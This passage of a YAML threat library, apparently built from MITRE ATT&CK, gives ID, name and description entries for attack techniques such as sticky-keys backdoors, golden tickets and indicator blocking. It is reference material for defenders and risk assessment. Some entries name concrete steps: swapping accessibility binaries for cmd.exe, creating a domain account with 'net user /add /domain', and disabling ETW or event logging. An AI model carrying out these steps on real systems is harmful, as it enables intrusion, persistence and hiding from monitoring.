  - urn: urn:intuitem:risk:threat:mitre-attack:t1593.003
    ref_id: T1593.003
    name: Code Repositories
    description: "Adversaries may search public code repositories for information\
      \ about victims that can be used during targeting. Victims may store code in\
      \ repositories on various third-party websites such as GitHub, GitLab, SourceForge,\
      \ and BitBucket. Users typically interact with code repositories through a web\
      \ application or command-line utilities such as git.  \n\nAdversaries may search\
      \ various public code repositories for various information about a victim. Public\
      \ code repositories can often be a source of various general information about\
      \ victims, such as commonly used programming languages and libraries as well\
      \ as the names of employees. Adversaries may also identify more sensitive data,\
      \ including accidentally leaked credentials or API keys.(Citation: GitHub Cloud\
      \ Service Credentials) Information from these sources may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)),\
      \ establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ or [Phishing](https://attack.mitre.org/techniques/T1566)). \n\n**Note:** This\
      \ is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003),\
      \ which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from\
      \ private and internally hosted code repositories.\nhttps://attack.mitre.org/techniques/T1593/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.005
    ref_id: T1574.005
    name: Executable Installer File Permissions Weakness
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the binaries used by an installer. These processes may automatically execute
      specific binaries as part of their functionality or to perform other actions.
      If the permissions on the file system directory containing a target binary,
      or permissions on the binary itself, are improperly set, then the target binary
      may be overwritten with another binary using user-level permissions and executed
      by the original process. If the original process and thread are running under
      a higher permissions level, then the replaced binary will also execute under
      higher-level permissions, which could include SYSTEM.


      Another variation of this technique can be performed by taking advantage of
      a weakness that is common in executable, self-extracting installers. During
      the installation process, it is common for installers to use a subdirectory
      within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs,
      or other payloads. When installers create subdirectories and files they often
      do not set appropriate permissions to restrict write access, which allows for
      execution of untrusted code placed in the subdirectories or overwriting of binaries
      used in the installation process. This behavior is related to and may take advantage
      of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).


      Adversaries may use this technique to replace legitimate binaries with malicious
      ones as a means of executing code at a higher permissions level. Some installers
      may also require elevated privileges that will result in privilege escalation
      when executing adversary controlled code. This behavior is related to [Bypass
      User Account Control](https://attack.mitre.org/techniques/T1548/002). Several
      examples of this weakness in existing common installers have been reported to
      software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers
      are Vulnerable) If the executing process is set to run at a specific time or
      during a certain event (e.g., system bootup) then this technique can also be
      used for persistence.

      https://attack.mitre.org/techniques/T1574/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.008
    ref_id: T1546.008
    name: Accessibility Features
    description: 'Adversaries may establish persistence and/or elevate privileges
      by executing malicious content triggered by accessibility features. Windows
      contains accessibility features that may be launched with a key combination
      before a user has logged in (ex: when the user is on the Windows logon screen).
      An adversary can modify the way these programs are launched to get a command
      prompt or backdoor without logging in to the system.


      Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>,
      launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>,
      launched when the Windows + U key combination is pressed. The sethc.exe program
      is often referred to as "sticky keys", and has been used by adversaries for
      unauthenticated access through a remote desktop login screen. (Citation: FireEye
      Hikit Rootkit)


      Depending on the version of Windows, an adversary may take advantage of these
      features in different ways. Common methods used by adversaries include replacing
      accessibility feature binaries or pointers/references to these binaries in the
      Registry. In newer versions of Windows, the replaced binary needs to be digitally
      signed for x64 systems, the binary must reside in <code>%systemdir%\</code>,
      and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation:
      DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012)
      debugger method was likely discovered as a potential workaround because it does
      not require the corresponding accessibility feature binary to be replaced.


      For simple binary replacement on Windows XP and later as well as and Windows
      Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>)
      may be replaced with "cmd.exe" (or another program that provides backdoor access).
      Subsequently, pressing the appropriate key combination at the login screen while
      sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      will cause the replaced file to be executed with SYSTEM privileges. (Citation:
      Tilbury 2014)


      Other accessibility features exist that may also be leveraged in a similar fashion:
      (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)


      * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>

      * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>

      * Narrator: <code>C:\Windows\System32\Narrator.exe</code>

      * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>

      * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

      https://attack.mitre.org/techniques/T1546/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.002
    ref_id: T1496.002
    name: Bandwidth Hijacking
    description: "Adversaries may leverage the network bandwidth resources of co-opted\
      \ systems to complete resource-intensive tasks, which may impact system and/or\
      \ hosted service availability. \n\nAdversaries may also use malware that leverages\
      \ a system's network bandwidth as part of a botnet in order to facilitate [Network\
      \ Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or\
      \ to seed malicious torrents.(Citation: GoBotKR) Alternatively, they may engage\
      \ in proxyjacking by selling use of the victims' network bandwidth and IP address\
      \ to proxyware services.(Citation: Sysdig Proxyjacking) Finally, they may engage\
      \ in internet-wide scanning in order to identify additional targets for compromise.(Citation:\
      \ Unit 42 Leaked Environment Variables 2024)\n\nIn addition to incurring potential\
      \ financial costs or availability disruptions, this technique may cause reputational\
      \ damage if a victim\u2019s bandwidth is used for illegal activities.(Citation:\
      \ Sysdig Proxyjacking)\nhttps://attack.mitre.org/techniques/T1496/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1087
    ref_id: T1087
    name: Account Discovery
    description: "Adversaries may attempt to get a listing of valid accounts, usernames,\
      \ or email addresses on a system or within a compromised environment. This information\
      \ can help adversaries determine which accounts exist, which can aid in follow-on\
      \ behavior such as brute-forcing, spear-phishing attacks, or account takeovers\
      \ (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries\
      \ may use several methods to enumerate accounts, including abuse of existing\
      \ tools, built-in commands, and potential misconfigurations that leak account\
      \ names and roles or permissions in the targeted environment.\n\nFor examples,\
      \ cloud environments typically provide easily accessible interfaces to obtain\
      \ user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie\
      \ Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ and other command line functionality to identify accounts. Information about\
      \ email addresses and accounts may also be extracted by searching an infected\
      \ system\u2019s files.\nhttps://attack.mitre.org/techniques/T1087"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090
    ref_id: T1090
    name: Proxy
    description: 'Adversaries may use a connection proxy to direct network traffic
      between systems or act as an intermediary for network communications to a command
      and control server to avoid direct connections to their infrastructure. Many
      tools exist that enable traffic redirection through proxies or port redirection,
      including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap.
      (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies
      to manage command and control communications, reduce the number of simultaneous
      outbound network connections, provide resiliency in the face of connection loss,
      or to ride over existing trusted communications paths between victims to avoid
      suspicion. Adversaries may chain together multiple proxies to further disguise
      the source of malicious traffic.


      Adversaries can also take advantage of routing schemes in Content Delivery Networks
      (CDNs) to proxy command and control traffic.

      https://attack.mitre.org/techniques/T1090'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059
    ref_id: T1059
    name: Command and Scripting Interpreter
    description: 'Adversaries may abuse command and script interpreters to execute
      commands, scripts, or binaries. These interfaces and languages provide ways
      of interacting with computer systems and are a common feature across many different
      platforms. Most systems come with some built-in command-line interface and scripting
      capabilities, for example, macOS and Linux distributions include some flavor
      of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows
      installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)
      and [PowerShell](https://attack.mitre.org/techniques/T1059/001).


      There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006),
      as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007)
      and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).


      Adversaries may abuse these technologies in various ways as a means of executing
      arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001)
      payloads delivered to victims as lure documents or as secondary payloads downloaded
      from an existing C2. Adversaries may also execute commands through interactive
      terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021)
      in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation:
      Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell
      Execution in Python)

      https://attack.mitre.org/techniques/T1059'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.006
    ref_id: T1562.006
    name: Indicator Blocking
    description: "An adversary may attempt to block indicators or events typically\
      \ captured by sensors from being gathered and analyzed. This could include maliciously\
      \ redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based\
      \ sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About\
      \ Event Tracing 2018), by tampering settings that control the collection and\
      \ flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These\
      \ settings may be stored on the system in configuration files and/or in the\
      \ Registry as well as being accessible via administrative utilities such as\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management\
      \ Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example,\
      \ adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\\
      CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious\
      \ actions in a new or different .evtx log file. This action does not require\
      \ a system reboot and takes effect immediately.(Citation: disable_win_evt_logging)\
      \ \n\nETW interruption can be achieved multiple ways, however most directly\
      \ by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the\
      \ Registry to make alterations.\n\nIn the case of network-based reporting of\
      \ indicators, an adversary may block traffic associated with reporting to prevent\
      \ central analysis. This may be accomplished by many means, such as stopping\
      \ a local process responsible for forwarding telemetry and/or creating a host-based\
      \ firewall rule to block traffic to specific hosts responsible for aggregating\
      \ events, such as security information and event management (SIEM) products.\n\
      \nIn Linux environments, adversaries may disable or reconfigure log processing\
      \ tools such as syslog or nxlog to inhibit detection and monitoring capabilities\
      \ to facilitate follow on behaviors (Citation: LemonDuck).\nhttps://attack.mitre.org/techniques/T1562/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1136.002
    ref_id: T1136.002
    name: Domain Account
    description: 'Adversaries may create a domain account to maintain access to victim
      systems. Domain accounts are those managed by Active Directory Domain Services
      where access and permissions are configured across systems and services that
      are part of that domain. Domain accounts can cover user, administrator, and
      service accounts. With a sufficient level of access, the <code>net user /add
      /domain</code> command can be used to create a domain account.(Citation: Savill
      1999)


      Such accounts may be used to establish secondary credentialed access that do
      not require persistent remote access tools to be deployed on the system.

      https://attack.mitre.org/techniques/T1136/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.003
    ref_id: T1589.003
    name: Employee Names
    description: 'Adversaries may gather employee names that can be used during targeting.
      Employee names be used to derive email addresses as well as to help guide other
      reconnaissance efforts and/or craft more-believable lures.


      Adversaries may easily gather employee names, since they may be readily available
      and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      OPM Leak) Gathering this information may reveal opportunities for other forms
      of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1482
    ref_id: T1482
    name: Domain Trust Discovery
    description: 'Adversaries may attempt to gather information on domain trust relationships
      that may be used to identify lateral movement opportunities in Windows multi-domain/forest
      environments. Domain trusts provide a mechanism for a domain to allow access
      to resources based on the authentication procedures of another domain.(Citation:
      Microsoft Trusts) Domain trusts allow the users of the trusted domain to access
      resources in the trusting domain. The information discovered may help the adversary
      conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005),
      [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation:
      AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts
      can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET
      methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359)
      is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft
      Operation Wilysupply)

      https://attack.mitre.org/techniques/T1482'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.001
    ref_id: T1558.001
    name: Golden Ticket
    description: "Adversaries who have the KRBTGT account password hash may forge\
      \ Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation:\
      \ AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate\
      \ authentication material for any account in Active Directory.(Citation: CERT-EU\
      \ Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then\
      \ able to request ticket granting service (TGS) tickets, which enable access\
      \ to specific resources. Golden tickets require adversaries to interact with\
      \ the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity\
      \ Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers\
      \ that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution\
      \ Center (KDC) service account and is responsible for encrypting and signing\
      \ all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT\
      \ password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
      \ and privileged access to a domain controller.\nhttps://attack.mitre.org/techniques/T1558/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1020
    ref_id: T1020
    name: Automated Exfiltration
    description: "Adversaries may exfiltrate data, such as sensitive documents, through\
      \ the use of automated processing after being gathered during Collection.(Citation:\
      \ ESET Gamaredon June 2020) \n\nWhen automated exfiltration is used, other exfiltration\
      \ techniques likely apply as well to transfer the information out of the network,\
      \ such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041)\
      \ and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).\n\
      https://attack.mitre.org/techniques/T1020"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.004
    ref_id: T1592.004
    name: Client Configurations
    description: 'Adversaries may gather information about the victim''s client configurations
      that can be used during targeting. Information about client configurations may
      include a variety of details and settings, including operating system/version,
      virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex:
      listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then include malicious content designed
      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the client configurations may also be exposed to adversaries via online
      or other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
      or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1592/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.007
    ref_id: T1562.007
    name: Disable or Modify Cloud Firewall
    description: "Adversaries may disable or modify a firewall within a cloud environment\
      \ to bypass controls that limit access to cloud resources. Cloud firewalls are\
      \ separate from system firewalls that are described in [Disable or Modify System\
      \ Firewall](https://attack.mitre.org/techniques/T1562/004). \n\nCloud environments\
      \ typically utilize restrictive security groups and firewall rules that only\
      \ allow network activity from trusted IP addresses via expected ports and protocols.\
      \ An adversary with appropriate permissions may introduce new firewall rules\
      \ or policies to allow access into a victim cloud environment and/or move laterally\
      \ from the cloud control plane to the data plane. For example, an adversary\
      \ may use a script or utility that creates new ingress rules in existing security\
      \ groups (or creates new security groups entirely) to allow any TCP/IP connectivity\
      \ to a cloud-hosted instance.(Citation: Palo Alto Unit 42 Compromised Cloud\
      \ Compute Credentials 2022) They may also remove networking limitations to support\
      \ traffic associated with malicious activity (such as cryptomining).(Citation:\
      \ Expel IO Evil in AWS)(Citation: Palo Alto Unit 42 Compromised Cloud Compute\
      \ Credentials 2022)\n\nModifying or disabling a cloud firewall may enable adversary\
      \ C2 communications, lateral movement, and/or data exfiltration that would otherwise\
      \ not be allowed. It may also be used to open up resources for [Brute Force](https://attack.mitre.org/techniques/T1110)\
      \ or [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).\n\
      https://attack.mitre.org/techniques/T1562/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.002
    ref_id: T1036.002
    name: Right-to-Left Override
    description: 'Adversaries may abuse the right-to-left override (RTLO or RLO) character
      (U+202E) to disguise a string and/or file name to make it appear benign. RTLO
      is a non-printing Unicode character that causes the text that follows it to
      be displayed in reverse. For example, a Windows screensaver executable named
      <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>.
      A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed
      as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)


      Adversaries may abuse the RTLO character as a means of tricking a user into
      executing what they think is a benign file type. A common use of this technique
      is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious
      File](https://attack.mitre.org/techniques/T1204/002) since it can trick both
      end users and defenders if they are not aware of how their tools display and
      render the RTLO character. Use of the RTLO character has been seen in many targeted
      intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation:
      Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well,
      where regedit.exe displays the reversed characters but the command line tool
      reg.exe does not by default.

      https://attack.mitre.org/techniques/T1036/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.001
    ref_id: T1588.001
    name: Malware
    description: 'Adversaries may buy, steal, or download malware that can be used
      during targeting. Malicious software can include payloads, droppers, post-compromise
      tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware
      to support their operations, obtaining a means for maintaining control of remote
      machines, evading defenses, and executing post-compromise behaviors.


      In addition to downloading free malware from the internet, adversaries may purchase
      these capabilities from third-party entities. Third-party entities can include
      technology companies that specialize in malware development, criminal marketplaces
      (including Malware-as-a-Service, or MaaS), or from individuals. In addition
      to purchasing malware, adversaries may steal and repurpose malware from third-party
      entities (including other adversaries).

      https://attack.mitre.org/techniques/T1588/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542.002
    ref_id: T1542.002
    name: Component Firmware
    description: 'Adversaries may modify component firmware to persist on systems.
      Some adversaries may employ sophisticated means to compromise computer components
      and install malicious firmware that will execute adversary code outside of the
      operating system and main system firmware or BIOS. This technique may be similar
      to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted
      upon other system components/devices that may not have the same capability or
      level of integrity checking.


      Malicious component firmware could provide both a persistent level of access
      to systems despite potential typical failures to maintain access and hard disk
      re-images, as well as a way to evade host software-based defenses and integrity
      checks.

      https://attack.mitre.org/techniques/T1542/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070
    ref_id: T1070
    name: Indicator Removal
    description: "Adversaries may delete or modify artifacts generated within systems\
      \ to remove evidence of their presence or hinder defenses. Various artifacts\
      \ may be created by an adversary or something that can be attributed to an adversary\u2019\
      s actions. Typically these artifacts are used as defensive indicators related\
      \ to monitored events, such as strings from downloaded files, logs that are\
      \ generated from user actions, and other data analyzed by defenders. Location,\
      \ format, and type of artifact (such as command or login history) are often\
      \ specific to each platform.\n\nRemoval of these indicators may interfere with\
      \ event collection, reporting, or other processes used to detect intrusion activity.\
      \ This may compromise the integrity of security solutions by causing notable\
      \ events to go unreported. This activity may also impede forensic analysis and\
      \ incident response, due to lack of sufficient data to determine what occurred.\n\
      https://attack.mitre.org/techniques/T1070"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.001
    ref_id: T1048.001
    name: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
    description: "Adversaries may steal data by exfiltrating it over a symmetrically\
      \ encrypted network protocol other than that of the existing command and control\
      \ channel. The data may also be sent to an alternate network location from the\
      \ main command and control server. \n\nSymmetric encryption algorithms are those\
      \ that use shared or the same keys/secrets on each end of the channel. This\
      \ requires an exchange or pre-arranged agreement/possession of the value used\
      \ to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption\
      \ often utilize symmetric encryption once keys are exchanged, but adversaries\
      \ may opt to manually share keys and implement symmetric cryptographic algorithms\
      \ (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This\
      \ may result in multiple layers of encryption (in protocols that are natively\
      \ encrypted such as HTTPS) or encryption in protocols that not typically encrypted\
      \ (such as HTTP or FTP).\nhttps://attack.mitre.org/techniques/T1048/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.001
    ref_id: T1137.001
    name: Office Template Macros
    description: "Adversaries may abuse Microsoft Office templates to obtain persistence\
      \ on a compromised system. Microsoft Office contains templates that are part\
      \ of common Office applications and are used to customize styles. The base templates\
      \ within the application are used each time an application starts. (Citation:\
      \ Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications\
      \ (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base\
      \ template and used to execute code when the respective Office application starts\
      \ in order to obtain persistence. Examples for both Word and Excel have been\
      \ discovered and published. By default, Word has a Normal.dotm template created\
      \ that can be modified to include a malicious macro. Excel does not have a template\
      \ file created by default, but one can be added that will automatically be loaded.(Citation:\
      \ enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates\
      \ may also be stored and pulled from remote locations.(Citation: GlobalDotName\
      \ Jun 2019) \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&lt;username&gt;\\\
      AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb\
      \ location:<br>\n<code>C:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\\
      Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location\
      \ of the base template to point to their own by hijacking the application's\
      \ search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\\
      Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying\
      \ the GlobalDotName registry key. By modifying the GlobalDotName registry key\
      \ an adversary can specify an arbitrary location, file name, and file extension\
      \ to use for the template that will be loaded on application startup. To abuse\
      \ GlobalDotName, adversaries may first need to register the template as a trusted\
      \ document or place it in a trusted location.(Citation: GlobalDotName Jun 2019)\
      \ \n\nAn adversary may need to enable macros to execute unrestricted depending\
      \ on the system or enterprise security policy on use of macros.\nhttps://attack.mitre.org/techniques/T1137/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.003
    ref_id: T1583.003
    name: Virtual Private Server
    description: "Adversaries may rent Virtual Private Servers (VPSs)\_that can be\
      \ used during targeting. There exist a variety of cloud service providers that\
      \ will sell virtual machines/containers as a service. By utilizing a VPS, adversaries\
      \ can make it difficult to physically tie back operations to them. The use of\
      \ cloud infrastructure can also make it easier for adversaries to rapidly provision,\
      \ modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in\
      \ later stages of the adversary lifecycle, such as Command and Control, can\
      \ allow adversaries to benefit from the ubiquity and trust associated with higher\
      \ reputation cloud service providers. Adversaries may also acquire infrastructure\
      \ from VPS service providers that are known for renting VPSs with minimal registration\
      \ information, allowing for more anonymous acquisitions of infrastructure.(Citation:\
      \ TrendmicroHideoutsLease)\nhttps://attack.mitre.org/techniques/T1583/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.001
    ref_id: T1213.001
    name: Confluence
    description: 'Adversaries may leverage Confluence repositories to mine valuable
      information. Often found in development environments alongside Atlassian JIRA,
      Confluence is generally used to store development-related documentation, however,
      in general may contain more diverse categories of useful information, such as:


      * Policies, procedures, and standards

      * Physical / logical network diagrams

      * System architecture diagrams

      * Technical system documentation

      * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))

      * Work / project schedules

      * Source code snippets

      * Links to network shares and other internal resources

      https://attack.mitre.org/techniques/T1213/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.003
    ref_id: T1550.003
    name: Pass the Ticket
    description: "Adversaries may \u201Cpass the ticket\u201D using stolen Kerberos\
      \ tickets to move laterally within an environment, bypassing normal system access\
      \ controls. Pass the ticket (PtT) is a method of authenticating to a system\
      \ using Kerberos tickets without having access to an account's password. Kerberos\
      \ authentication can be used as the first step to lateral movement to a remote\
      \ system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
      \ A user's service tickets or ticket granting ticket (TGT) may be obtained,\
      \ depending on the level of access. A service ticket allows for access to a\
      \ particular resource, whereas a TGT can be used to request service tickets\
      \ from the Ticket Granting Service (TGS) to access any resource the user has\
      \ privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation:\
      \ GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002)\
      \ can be obtained for services that use Kerberos as an authentication mechanism\
      \ and are used to generate tickets to access that particular resource and the\
      \ system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD\
      \ Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)\
      \ can be obtained for the domain using the Key Distribution Service account\
      \ KRBTGT account NTLM hash, which enables generation of TGTs for any account\
      \ in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create\
      \ a valid Kerberos ticket using other user information, such as stolen password\
      \ hashes or AES keys. For example, \"overpassing the hash\" involves using a\
      \ NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002))\
      \ while also using the password hash to create a valid Kerberos ticket.(Citation:\
      \ Stealthbits Overpass-the-Hash)\nhttps://attack.mitre.org/techniques/T1550/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1609
    ref_id: T1609
    name: Container Administration Command
    description: 'Adversaries may abuse a container administration service to execute
      commands within a container. A container administration service such as the
      Docker daemon, the Kubernetes API server, or the kubelet may allow remote management
      of containers within an environment.(Citation: Docker Daemon CLI)(Citation:
      Kubernetes API)(Citation: Kubernetes Kubelet)


      In Docker, adversaries may specify an entrypoint during container deployment
      that executes a script or command, or they may use a command such as <code>docker
      exec</code> to execute a command within a running container.(Citation: Docker
      Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient
      permissions, they may gain remote execution in a container in the cluster via
      interaction with the Kubernetes API server, the kubelet, or by running a command
      such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)

      https://attack.mitre.org/techniques/T1609'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1083
    ref_id: T1083
    name: File and Directory Discovery
    description: 'Adversaries may enumerate files and directories or may search in
      specific locations of a host or network share for certain information within
      a file system. Adversaries may use the information from [File and Directory
      Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Many command shell utilities can be used to obtain this information. Examples
      include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>,
      and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may
      also be used to gather file and directory information and interact with the
      [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also
      leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to gather file and directory information (e.g. <code>dir</code>,
      <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)


      Some files and directories may require elevated or specific user permissions
      to access.

      https://attack.mitre.org/techniques/T1083'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568
    ref_id: T1568
    name: Dynamic Resolution
    description: 'Adversaries may dynamically establish connections to command and
      control infrastructure to evade common detections and remediations. This may
      be achieved by using malware that shares a common algorithm with the infrastructure
      the adversary uses to receive the malware''s communications. These calculations
      can be used to dynamically adjust parameters such as the domain name, IP address,
      or port number the malware uses for command and control.


      Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).
      When contact is lost with the primary command and control server malware may
      employ dynamic resolution as a means to reestablishing command and control.(Citation:
      Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit
      2017 Activity)

      https://attack.mitre.org/techniques/T1568'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.004
    ref_id: T1036.004
    name: Masquerade Task or Service
